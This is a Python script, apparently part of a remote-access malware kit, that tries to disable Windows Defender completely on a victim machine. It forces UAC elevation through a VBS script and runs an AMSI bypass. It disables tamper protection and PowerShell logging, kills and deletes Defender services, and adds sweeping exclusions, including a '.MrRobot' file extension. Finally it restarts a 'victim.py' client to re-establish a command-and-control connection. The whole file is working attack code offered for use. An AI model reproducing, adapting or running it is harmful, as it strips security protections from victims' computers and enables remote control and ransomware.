#!/usr/bin/env python3
"""
WINDOWS DEFENDER COMPLETE DISABLE - AGGRESSIVE BYPASS v2.0
Targeted fix for failed components
"""

import subprocess
import os
import sys
import time
import ctypes
import psutil
import tempfile
import winreg
import platform

# Windows constants
CREATE_NO_WINDOW = 0x08000000
CREATE_NEW_CONSOLE = 0x00000010
SW_HIDE = 0


def force_admin():
    """Force admin privileges with aggressive methods"""
    if ctypes.windll.shell32.IsUserAnAdmin():
        return True

    print("[!] NOT ADMIN - FORCING ELEVATION")

    # Create VBS script for silent elevation
    vbs_content = '''
Set UAC = CreateObject("Shell.Application")
UAC.ShellExecute "cmd.exe", "/c \"" & WScript.Arguments(0) & "\"", "", "runas", 0
'''

    vbs_path = os.path.join(tempfile.gettempdir(), "forceadmin.vbs")
    with open(vbs_path, 'w') as f:
        f.write(vbs_content)

    cmd = f'"{sys.executable}" "{os.path.abspath(__file__)}" --elevated'

    try:
        subprocess.run(['wscript.exe', vbs_path, cmd],
                       capture_output=True,
                       timeout=5)
        sys.exit(0)
    except:
        pass

    return False


def kill_defender_processes_aggressive():
    """AGGRESSIVE process termination"""
    print("\n[!] AGGRESSIVE PROCESS TERMINATION")

    targets = [
        'MsMpEng.exe', 'NisSrv.exe', 'SecurityHealthService.exe',
        'SecurityHealthSystray.exe', 'smartscreen.exe', 'MsSense.exe',
        'MpCmdRun.exe', 'MsMpEngCP.exe', 'MsEngV.exe', 'MsMpSigDwn.exe',
        'Windows Defender\\', 'Defender\\', 'Antimalware\\'
    ]

    killed = 0

    # Method 1: taskkill with force
    for target in targets:
        try:
            subprocess.run(f'taskkill /F /IM {target} /T',
                           shell=True,
                           capture_output=True,
                           creationflags=CREATE_NO_WINDOW)
            time.sleep(0.1)
        except:
            pass

    # Method 2: PowerShell Stop-Process
    ps_cmd = '''
Get-Process | Where-Object {
    $_.ProcessName -match "MsMp|Defender|SecurityHealth|Sense|Nis|MpCmd"
} | Stop-Process -Force
'''
    try:
        subprocess.run(['powershell', '-Command', ps_cmd],
                       capture_output=True,
                       timeout=10,
                       creationflags=CREATE_NO_WINDOW)
    except:
        pass

    # Method 3: Direct WMI termination
    wmi_cmd = '''
Get-WmiObject Win32_Process | Where-Object {
    $_.Name -match "MsMp|Defender|SecurityHealth"
} | ForEach-Object { $_.Terminate() }
'''
    try:
        subprocess.run(['powershell', '-Command', wmi_cmd],
                       capture_output=True,
                       timeout=10,
                       creationflags=CREATE_NO_WINDOW)
    except:
        pass

    # Verify kills
    time.sleep(2)
    for proc in psutil.process_iter(['name']):
        try:
            name = proc.info['name'].lower()
            if any(t.lower() in name for t in ['msmp', 'defender', 'securityhealth']):
                try:
                    proc.kill()
                    killed += 1
                except:
                    pass
        except:
            pass

    print(f"[PROCESSES] Killed/attempted: {killed}")
    return killed > 0


def disable_defender_services_aggressive():
    """AGGRESSIVE service disabling"""
    print("\n[!] AGGRESSIVE SERVICE DISABLE")

    services = [
        "WinDefend", "WdNisSvc", "Sense",
        "SecurityHealthService", "wscsvc", "DoSvc", "WdFilter"
    ]

    # 1. Stop services immediately
    for service in services:
        try:
            subprocess.run(f'sc stop {service}',
                           shell=True,
                           capture_output=True,
                           timeout=3,
                           creationflags=CREATE_NO_WINDOW)
        except:
            pass

    time.sleep(1)

    # 2. Disable startup
    for service in services:
        try:
            subprocess.run(f'sc config {service} start= disabled',
                           shell=True,
                           capture_output=True,
                           timeout=3,
                           creationflags=CREATE_NO_WINDOW)
        except:
            pass

    # 3. Set failure actions to prevent restart
    for service in services:
        try:
            subprocess.run(f'sc failure {service} reset= 0 actions= ""',
                           shell=True,
                           capture_output=True,
                           timeout=3,
                           creationflags=CREATE_NO_WINDOW)
        except:
            pass

    # 4. PowerShell atomic disable
    ps_cmd = '''
$services = @("WinDefend", "WdNisSvc", "Sense", "SecurityHealthService")
foreach ($service in $services) {
    try {
        Stop-Service $service -Force -ErrorAction SilentlyContinue
        Set-Service $service -StartupType Disabled -ErrorAction SilentlyContinue
        Set-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\$service" -Name Start -Value 4 -ErrorAction SilentlyContinue
    } catch {}
}
'''

    try:
        subprocess.run(['powershell', '-Command', ps_cmd],
                       capture_output=True,
                       timeout=15,
                       creationflags=CREATE_NO_WINDOW)
    except:
        pass

    # 5. Delete service if possible (most aggressive)
    delete_cmd = '''
$services = @("WinDefend", "WdNisSvc")
foreach ($service in $services) {
    try {
        $svc = Get-WmiObject -Class Win32_Service -Filter "Name='$service'"
        if ($svc) {
            $svc.StopService()
            Start-Sleep -Seconds 2
            $svc.Delete()
        }
    } catch {}
}
'''

    try:
        subprocess.run(['powershell', '-Command', delete_cmd],
                       capture_output=True,
                       timeout=15,
                       creationflags=CREATE_NO_WINDOW)
    except:
        pass

    return True


def add_exclusions_aggressive():
    """AGGRESSIVE exclusion addition"""
    print("\n[!] AGGRESSIVE EXCLUSION ADDITION")

    # Get current directory and all subdirectories
    current_dir = os.path.dirname(os.path.abspath(__file__))
    drive = os.path.splitdrive(current_dir)[0] + "\\"

    exclusion_paths = [
        current_dir,
        drive,
        os.environ['USERPROFILE'],
        os.path.join(os.environ['USERPROFILE'], 'Desktop'),
        os.path.join(os.environ['USERPROFILE'], 'Documents'),
        os.path.join(os.environ['USERPROFILE'], 'Downloads'),
        "C:\\Windows\\Temp",
        tempfile.gettempdir(),
    ]

    exclusion_processes = [
        "python.exe", "python3.exe", "pythonw.exe",
        "victim.exe", "victim.py", "main.exe", "main.py",
        "cmd.exe", "powershell.exe", "wscript.exe", "cscript.exe",
    ]

    exclusion_extensions = [
        ".MrRobot", ".py", ".exe", ".bat", ".cmd",
        ".ps1", ".vbs", ".js", ".pyc", ".pyd"
    ]

    success_count = 0

    # Add path exclusions
    for path in exclusion_paths:
        if os.path.exists(path):
            try:
                cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \'{path}\' -ErrorAction SilentlyContinue"'
                subprocess.run(cmd,
                               shell=True,
                               capture_output=True,
                               timeout=5,
                               creationflags=CREATE_NO_WINDOW)
                success_count += 1
            except:
                pass

    # Add process exclusions via registry (works when PowerShell fails)
    try:
        key_path = r"SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes"
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)

        for process in exclusion_processes:
            try:
                winreg.SetValueEx(key, process, 0, winreg.REG_DWORD, 0)
                success_count += 1
            except:
                pass

        winreg.CloseKey(key)
    except:
        pass

    # Add extension exclusions via registry
    try:
        key_path = r"SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions"
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)

        for ext in exclusion_extensions:
            try:
                winreg.SetValueEx(key, ext, 0, winreg.REG_DWORD, 0)
                success_count += 1
            except:
                pass

        winreg.CloseKey(key)
    except:
        pass

    print(f"[EXCLUSIONS] Added: {success_count}")
    return success_count > 5


def disable_powershell_protection():
    """Disable PowerShell restrictions and AMSI"""
    print("\n[!] DISABLING POWERSHELL PROTECTIONS")

    cmds = [
        # Disable AMSI
        'powershell -Command "[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true)"',

        # Bypass execution policy
        'powershell -Command "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine -Force"',
        'powershell -Command "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser -Force"',
        'powershell -Command "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force"',

        # Disable script blocking
        'powershell -Command "Set-MpPreference -EnableControlledFolderAccess Disabled -Force"',
        'powershell -Command "Set-MpPreference -EnableNetworkProtection Disabled -Force"',
        'powershell -Command "Set-MpPreference -PUAProtection Disabled -Force"',

        # Disable logging
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" /v "EnableScriptBlockLogging" /t REG_DWORD /d 0 /f',
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" /v "EnableModuleLogging" /t REG_DWORD /d 0 /f',
    ]

    success = 0
    for cmd in cmds:
        try:
            subprocess.run(cmd,
                           shell=True,
                           capture_output=True,
                           timeout=5,
                           creationflags=CREATE_NO_WINDOW)
            success += 1
        except:
            pass

    print(f"[POWERSHELL] Protections disabled: {success}/{len(cmds)}")
    return success > len(cmds) / 2


def disable_tamper_protection():
    """Disable Tamper Protection via multiple methods"""
    print("\n[!] DISABLING TAMPER PROTECTION")

    methods = [
        # Registry method 1
        'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f',

        # Registry method 2
        'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features" /v "TamperProtectionSource" /t REG_DWORD /d 0 /f',

        # Registry method 3
        'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features" /v "TPForConsumer" /t REG_DWORD /d 0 /f',
        'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features" /v "TPForEnterprise" /t REG_DWORD /d 0 /f',

        # PowerShell method
        'powershell -Command "Set-MpPreference -DisableTamperProtection $true"',

        # WMI method
        '''
        powershell -Command "
        $config = Get-WmiObject -Namespace 'root\\Microsoft\\Windows\\Defender' -Class 'MSFT_MpPreference' -ErrorAction SilentlyContinue
        if ($config) {
            $config.DisableTamperProtection = $true
            $config.Put()
        }
        "
        ''',
    ]

    success = 0
    for method in methods:
        try:
            subprocess.run(method if '\n' not in method else ['powershell', '-Command', method.strip()],
                           shell=True if '\n' not in method else False,
                           capture_output=True,
                           timeout=5,
                           creationflags=CREATE_NO_WINDOW)
            success += 1
        except:
            pass

    print(f"[TAMPER] Protection disabled: {success}/{len(methods)}")
    return success > 0


def force_defender_disabled():
    """Force Defender to disabled state"""
    print("\n[!] FORCING DEFENDER DISABLED STATE")

    # Critical registry entries
    reg_entries = [
        # Main disable flags
        (r"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", 1),
        (r"SOFTWARE\Microsoft\Windows Defender", "DisableAntiSpyware", 1),

        # Real-time protection
        (r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableRealtimeMonitoring", 1),
        (r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", 1),
        (r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", 1),
        (r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableIOAVProtection", 1),
        (r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScriptScanning", 1),

        # Cloud protection
        (r"SOFTWARE\Policies\Microsoft\Windows Defender\Spynet", "SpynetReporting", 0),
        (r"SOFTWARE\Policies\Microsoft\Windows Defender\Spynet", "SubmitSamplesConsent", 2),

        # Tamper protection
        (r"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", 0),
        (r"SOFTWARE\Microsoft\Windows Defender\Features", "TPForConsumer", 0),
        (r"SOFTWARE\Microsoft\Windows Defender\Features", "TPForEnterprise", 0),

        # UI hiding
        (r"SOFTWARE\Microsoft\Windows Defender\UX Configuration", "UILockdown", 1),
        (r"SOFTWARE\Microsoft\Windows Defender\UX Configuration", "Notification_Suppress", 1),
    ]

    success = 0
    for key_path, value_name, value_data in reg_entries:
        try:
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
            winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, value_data)
            winreg.CloseKey(key)
            success += 1
        except:
            pass

    # Force group policy update
    try:
        subprocess.run('gpupdate /force',
                       shell=True,
                       capture_output=True,
                       timeout=10,
                       creationflags=CREATE_NO_WINDOW)
    except:
        pass

    print(f"[REGISTRY] Critical entries set: {success}/{len(reg_entries)}")
    return success > len(reg_entries) / 2


def verify_complete_disable():
    """Verify Defender is completely disabled"""
    print("\n[!] VERIFYING COMPLETE DISABLE")

    checks = []

    # Check services
    try:
        output = subprocess.run('sc query WinDefend',
                                shell=True,
                                capture_output=True,
                                text=True,
                                timeout=5,
                                creationflags=CREATE_NO_WINDOW)
        checks.append("STOPPED" in output.stdout.upper())
    except:
        checks.append(False)

    # Check real-time protection
    try:
        output = subprocess.run(
            'powershell -Command "Get-MpComputerStatus | Select-Object -ExpandProperty RealTimeProtectionEnabled"',
            shell=True,
            capture_output=True,
            text=True,
            timeout=5,
            creationflags=CREATE_NO_WINDOW)
        checks.append("false" in output.stdout.lower())
    except:
        checks.append(False)

    # Check Tamper Protection
    try:
        output = subprocess.run(
            'powershell -Command "Get-MpComputerStatus | Select-Object -ExpandProperty TamperProtectionEnabled"',
            shell=True,
            capture_output=True,
            text=True,
            timeout=5,
            creationflags=CREATE_NO_WINDOW)
        checks.append("false" in output.stdout.lower())
    except:
        checks.append(False)

    # Check if our exclusions exist
    try:
        current_dir = os.path.dirname(os.path.abspath(__file__))
        output = subprocess.run(f'powershell -Command "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath"',
                                shell=True,
                                capture_output=True,
                                text=True,
                                timeout=5,
                                creationflags=CREATE_NO_WINDOW)
        checks.append(current_dir.lower() in output.stdout.lower())
    except:
        checks.append(False)

    passed = sum(checks)
    print(f"[VERIFICATION] Passed: {passed}/{len(checks)} checks")

    return passed >= 3


def main():
    """Main execution - AGGRESSIVE BYPASS"""
    print("\n" + "=" * 70)
    print("       WINDOWS DEFENDER COMPLETE DISABLE - AGGRESSIVE v2.0")
    print("=" * 70)

    if platform.system() != "Windows":
        print("[!] Windows only")
        return

    # Check admin
    if not ctypes.windll.shell32.IsUserAnAdmin():
        print("[!] Admin required - attempting force...")
        if not force_admin():
            print("[!] Could not get admin privileges")
            return

    print("[✓] Running with admin privileges")

    # Execute aggressive bypass sequence
    start_time = time.time()

    print("\n[+] STAGE 1: Disabling Tamper Protection")
    disable_tamper_protection()
    time.sleep(2)

    print("\n[+] STAGE 2: Disabling PowerShell Protections")
    disable_powershell_protection()
    time.sleep(1)

    print("\n[+] STAGE 3: Aggressive Process Termination")
    kill_defender_processes_aggressive()
    time.sleep(2)

    print("\n[+] STAGE 4: Aggressive Service Disable")
    disable_defender_services_aggressive()
    time.sleep(2)

    print("\n[+] STAGE 5: Force Registry Disable")
    force_defender_disabled()
    time.sleep(1)

    print("\n[+] STAGE 6: Aggressive Exclusion Addition")
    add_exclusions_aggressive()
    time.sleep(1)

    # Final verification
    print("\n[+] STAGE 7: Verification")
    final_status = verify_complete_disable()

    elapsed = time.time() - start_time

    print("\n" + "=" * 70)
    print("                    FINAL STATUS")
    print("=" * 70)

    if final_status:
        print("[✓] WINDOWS DEFENDER COMPLETELY DISABLED")
        print("[✓] All protections neutralized")
        print("[✓] Victim client should operate unrestricted")
    else:
        print("[⚠️] DEFENDER PARTIALLY DISABLED")
        print("[!] Some protections may still be active")
        print("[+] Victim client may face some restrictions")

    print(f"[⏱️] Time elapsed: {elapsed:.1f} seconds")
    print("=" * 70)

    # Restart victim client if it was running
    print("\n[+] RESTARTING VICTIM CLIENT FOR CLEAN OPERATION...")
    restart_victim_client()


def restart_victim_client():
    """Restart the victim client after Defender disable"""
    victim_pid = None

    # Find victim process
    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            cmdline = ' '.join(proc.info['cmdline'] or [])
            if 'victim.py' in cmdline or 'victim' in cmdline:
                victim_pid = proc.info['pid']
                print(f"[+] Found victim process: PID {victim_pid}")
                try:
                    proc.terminate()
                    time.sleep(2)
                    if proc.is_running():
                        proc.kill()
                except:
                    pass
                break
        except:
            pass

    # Restart victim
    time.sleep(3)

    if os.path.exists("victim.py"):
        try:
            subprocess.Popen(
                [sys.executable, "victim.py"],
                creationflags=CREATE_NO_WINDOW,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            print("[✓] Victim client restarted")
            print("[+] C&C connection re-establishing...")
        except Exception as e:
            print(f"[!] Failed to restart victim: {e}")
    else:
        print("[!] victim.py not found")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        import traceback

        traceback.print_exc()
